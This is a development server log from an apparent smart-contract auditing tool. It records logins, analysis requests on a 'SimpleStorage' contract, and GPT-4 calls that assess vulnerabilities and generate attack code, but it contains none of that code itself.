2025-06-19 15:41:57,715 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:41:57,716 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:42:03,785 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:42:03] "OPTIONS /history HTTP/1.1" 200 -
2025-06-19 15:42:03,822 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:42:03] "GET /history HTTP/1.1" 200 -
2025-06-19 15:42:07,099 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:42:07] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 15:42:07,125 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 15:42:07,136 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 15:42:07,146 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 15:42:07,161 - solcx - INFO - Using solc version 0.8.0
2025-06-19 15:42:08,222 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:42:08] "GET /history HTTP/1.1" 200 -
2025-06-19 15:42:08,650 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:42:08,673 - app.modules.attack_generator - INFO - Received response from OpenAI API in 10.96 seconds
2025-06-19 15:42:08,679 - app.modules.attack_generator - INFO - Contract analysis completed in 10.96 seconds
2025-06-19 15:42:08,681 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any apparent security vulnerabilities. It does not hold any Ether, so the...
2025-06-19 15:42:08,684 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 15:42:08,687 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 15:42:08,690 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:42:08,692 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:42:09,518 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:42:10,186 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 15:42:10,188 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 15:42:10,190 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 15:42:10,191 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 15:42:10,193 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 15:42:10,194 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:42:10,195 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:42:11,202 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 15:42:11,219 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 15:42:11,234 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 15:42:11,251 - solcx - INFO - Using solc version 0.8.0
2025-06-19 15:42:13,565 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:42:13,586 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.90 seconds
2025-06-19 15:42:13,591 - app.modules.attack_generator - INFO - Attack code generation completed in 4.90 seconds
2025-06-19 15:42:13,593 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 424
2025-06-19 15:42:13,595 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 15.85 seconds
2025-06-19 15:42:13,597 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 15:42:13,620 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_15-42, status: KO
2025-06-19 15:42:13,624 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 15:42:13,628 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:42:13] "POST /analyze HTTP/1.1" 200 -
2025-06-19 15:42:13,811 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:42:14,450 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 15:42:14,452 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 15:42:14,453 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 15:42:14,454 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 15:42:14,456 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 15:42:14,457 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:42:14,458 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:42:21,142 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:42:21,158 - app.modules.attack_generator - INFO - Received response from OpenAI API in 10.96 seconds
2025-06-19 15:42:21,162 - app.modules.attack_generator - INFO - Contract analysis completed in 10.96 seconds
2025-06-19 15:42:21,165 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any apparent security vulnerabilities such as reentrancy, logic bugs, per...
2025-06-19 15:42:21,167 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 15:42:21,169 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 15:42:21,170 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:42:21,172 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:42:24,009 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:42:24,032 - app.modules.attack_generator - INFO - Received response from OpenAI API in 9.57 seconds
2025-06-19 15:42:24,038 - app.modules.attack_generator - INFO - Contract analysis completed in 9.57 seconds
2025-06-19 15:42:24,041 - app.modules.attack_generator - INFO - Vulnerability assessment: This contract does not have any security vulnerabilities in the traditional sense (reentrancy, logic...
2025-06-19 15:42:24,044 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 15:42:24,046 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 15:42:24,049 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:42:24,050 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:42:25,468 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:42:25,487 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.32 seconds
2025-06-19 15:42:25,492 - app.modules.attack_generator - INFO - Attack code generation completed in 4.32 seconds
2025-06-19 15:42:25,494 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 319
2025-06-19 15:42:25,497 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 15.28 seconds
2025-06-19 15:42:25,499 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 15:42:25,519 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_15-42, status: KO
2025-06-19 15:42:25,522 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 15:42:25,525 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:42:25] "POST /analyze HTTP/1.1" 200 -
2025-06-19 15:42:28,097 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:42:28,118 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.07 seconds
2025-06-19 15:42:28,123 - app.modules.attack_generator - INFO - Attack code generation completed in 4.07 seconds
2025-06-19 15:42:28,126 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 377
2025-06-19 15:42:28,128 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 13.64 seconds
2025-06-19 15:42:28,131 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 15:42:28,148 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_15-42, status: KO
2025-06-19 15:42:28,151 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 15:42:28,154 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:42:28] "POST /analyze HTTP/1.1" 200 -
2025-06-19 15:43:44,089 - app.app - INFO - Application started
2025-06-19 15:43:44,107 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.26.0.5:8000
2025-06-19 15:43:44,109 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 15:43:46,460 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:43:46] "OPTIONS /register HTTP/1.1" 200 -
2025-06-19 15:43:46,531 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:43:46] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-19 15:43:48,518 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:43:48] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-19 15:43:52,600 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:43:52] "OPTIONS /register HTTP/1.1" 200 -
2025-06-19 15:43:52,637 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:43:52] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-19 15:43:59,412 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:43:59] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 15:43:59,856 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:43:59] "POST /login HTTP/1.1" 200 -
2025-06-19 15:44:09,469 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:44:09] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 15:44:09,502 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 15:44:09,516 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 15:44:09,524 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 15:44:09,706 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 15:44:10,620 - solcx - INFO - Using solc version 0.8.0
2025-06-19 15:44:10,622 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-19 15:44:10,626 - solcx - INFO - Using solc version 0.8.0
2025-06-19 15:44:13,753 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:44:14,646 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 15:44:14,648 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 15:44:14,649 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 15:44:14,650 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 15:44:14,653 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 15:44:14,654 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:44:14,656 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:44:27,506 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:44:27,534 - app.modules.attack_generator - INFO - Received response from OpenAI API in 12.88 seconds
2025-06-19 15:44:27,546 - app.modules.attack_generator - INFO - Contract analysis completed in 12.88 seconds
2025-06-19 15:44:27,549 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any major vulnerabilities such as reentrancy, logic bugs, permission issu...
2025-06-19 15:44:27,551 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 15:44:27,553 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 15:44:27,555 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:44:27,557 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:44:32,539 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:44:32,568 - app.modules.attack_generator - INFO - Received response from OpenAI API in 5.01 seconds
2025-06-19 15:44:32,574 - app.modules.attack_generator - INFO - Attack code generation completed in 5.01 seconds
2025-06-19 15:44:32,576 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 415
2025-06-19 15:44:32,579 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 17.89 seconds
2025-06-19 15:44:32,581 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 15:44:32,627 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_15-44, status: KO
2025-06-19 15:44:32,629 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 15:44:32,632 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:44:32] "POST /analyze HTTP/1.1" 200 -
2025-06-19 15:45:04,514 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:45:04] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-19 15:45:04,540 - app.api.feedback - INFO - Received feedback submission from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 15:45:04,589 - app.api.feedback - INFO - Feedback saved with ID: 1, status: OK
2025-06-19 15:45:04,592 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:45:04] "POST /feedback HTTP/1.1" 200 -
2025-06-19 15:45:09,871 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:45:09] "OPTIONS /history HTTP/1.1" 200 -
2025-06-19 15:45:09,915 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 15:45:09] "GET /history HTTP/1.1" 200 -
2025-06-19 15:55:34,117 - app.app - INFO - Application started
2025-06-19 15:55:34,130 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.28.0.5:8000
2025-06-19 15:55:34,132 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 15:58:24,151 - app.app - INFO - Application started
2025-06-19 15:58:24,166 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.30.0.5:8000
2025-06-19 15:58:24,169 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 16:01:30,928 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:01:30] "OPTIONS /register HTTP/1.1" 200 -
2025-06-19 16:01:31,445 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:01:31] "POST /register HTTP/1.1" 200 -
2025-06-19 16:01:46,838 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:01:46] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 16:01:46,869 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:01:46] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-19 16:02:07,864 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:02:07] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 16:02:08,310 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:02:08] "POST /login HTTP/1.1" 200 -
2025-06-19 16:02:22,598 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:02:22] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 16:02:22,645 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-19 16:02:22,658 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 16:02:22,665 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 16:02:22,847 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 16:02:23,889 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:02:23,892 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-19 16:02:23,898 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:02:27,857 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:02:28,708 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 16:02:28,710 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 16:02:28,711 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 16:02:28,712 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 16:02:28,714 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:02:28,716 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:02:28,717 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:02:42,408 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:02:42,439 - app.modules.attack_generator - INFO - Received response from OpenAI API in 13.72 seconds
2025-06-19 16:02:42,446 - app.modules.attack_generator - INFO - Contract analysis completed in 13.72 seconds
2025-06-19 16:02:42,448 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any major security vulnerabilities like reentrancy, logic bugs, math erro...
2025-06-19 16:02:42,450 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 16:02:42,452 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:02:42,454 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:02:42,454 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:02:47,068 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:02:47,086 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.63 seconds
2025-06-19 16:02:47,090 - app.modules.attack_generator - INFO - Attack code generation completed in 4.63 seconds
2025-06-19 16:02:47,092 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 314
2025-06-19 16:02:47,094 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 18.35 seconds
2025-06-19 16:02:47,095 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 16:02:47,144 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_16-02, status: KO
2025-06-19 16:02:47,146 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 16:02:47,151 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:02:47] "POST /analyze HTTP/1.1" 200 -
2025-06-19 16:07:02,600 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:07:02] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 16:07:02,629 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-19 16:07:02,639 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 16:07:02,657 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 16:07:02,678 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:07:04,763 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:07:05,515 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 16:07:05,517 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 16:07:05,518 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 16:07:05,520 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 16:07:05,522 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:07:05,523 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:07:05,524 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:07:16,859 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:07:16,883 - app.modules.attack_generator - INFO - Received response from OpenAI API in 11.36 seconds
2025-06-19 16:07:16,888 - app.modules.attack_generator - INFO - Contract analysis completed in 11.36 seconds
2025-06-19 16:07:16,890 - app.modules.attack_generator - INFO - Vulnerability assessment: There are no security vulnerabilities in this contract. The contract does not hold any funds, so the...
2025-06-19 16:07:16,893 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 16:07:16,895 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:07:16,898 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:07:16,900 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:07:25,446 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:07:25,469 - app.modules.attack_generator - INFO - Received response from OpenAI API in 8.57 seconds
2025-06-19 16:07:25,473 - app.modules.attack_generator - INFO - Attack code generation completed in 8.57 seconds
2025-06-19 16:07:25,475 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 538
2025-06-19 16:07:25,478 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 19.93 seconds
2025-06-19 16:07:25,480 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 16:07:25,507 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_16-07, status: KO
2025-06-19 16:07:25,510 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 16:07:25,514 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 16:07:25] "POST /analyze HTTP/1.1" 200 -
2025-06-19 16:08:48,674 - app.app - INFO - Application started
2025-06-19 16:08:48,689 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.32.5:8000
2025-06-19 16:08:48,690 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 16:08:49,500 - werkzeug - INFO - 192.168.32.1 - - [19/Jun/2025 16:08:49] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 16:08:50,025 - werkzeug - INFO - 192.168.32.1 - - [19/Jun/2025 16:08:50] "POST /login HTTP/1.1" 200 -
2025-06-19 16:08:53,366 - werkzeug - INFO - 192.168.32.1 - - [19/Jun/2025 16:08:53] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 16:08:53,383 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-19 16:08:53,392 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 16:08:53,398 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 16:08:53,635 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 16:08:54,701 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:08:54,703 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-19 16:08:54,708 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:08:54,991 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_16-08, status: ERROR
2025-06-19 16:08:54,993 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 16:08:54,997 - werkzeug - INFO - 192.168.32.1 - - [19/Jun/2025 16:08:54] "POST /analyze HTTP/1.1" 200 -
2025-06-19 16:17:32,565 - werkzeug - INFO - 192.168.32.1 - - [19/Jun/2025 16:17:32] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 16:17:32,601 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-19 16:17:32,612 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 16:17:32,629 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 16:17:32,649 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:17:36,581 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:17:37,562 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 16:17:37,564 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 16:17:37,565 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 16:17:37,567 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 16:17:37,569 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:17:37,570 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:17:37,571 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:17:49,186 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:17:49,212 - app.modules.attack_generator - INFO - Received response from OpenAI API in 11.64 seconds
2025-06-19 16:17:49,223 - app.modules.attack_generator - INFO - Contract analysis completed in 11.64 seconds
2025-06-19 16:17:49,226 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any security vulnerabilities in the traditional sense (reentrancy, logic ...
2025-06-19 16:17:49,229 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 16:17:49,232 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:17:49,235 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:17:49,236 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:17:53,263 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:17:53,273 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.04 seconds
2025-06-19 16:17:53,276 - app.modules.attack_generator - INFO - Attack code generation completed in 4.04 seconds
2025-06-19 16:17:53,278 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 378
2025-06-19 16:17:53,280 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 15.68 seconds
2025-06-19 16:17:53,281 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 16:17:53,299 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_16-17, status: KO
2025-06-19 16:17:53,301 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 16:17:53,305 - werkzeug - INFO - 192.168.32.1 - - [19/Jun/2025 16:17:53] "POST /analyze HTTP/1.1" 200 -
2025-06-19 16:19:18,039 - app.app - INFO - Application started
2025-06-19 16:19:18,056 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.96.5:8000
2025-06-19 16:19:18,058 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 16:19:21,515 - werkzeug - INFO - 192.168.96.1 - - [19/Jun/2025 16:19:21] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 16:19:21,538 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-19 16:19:21,547 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 16:19:21,606 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 16:19:21,763 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 16:19:22,733 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:19:22,735 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-19 16:19:22,739 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:19:23,001 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_16-19, status: ERROR
2025-06-19 16:19:23,003 - app.api.contract - INFO - Analysis completed successfully, returning report
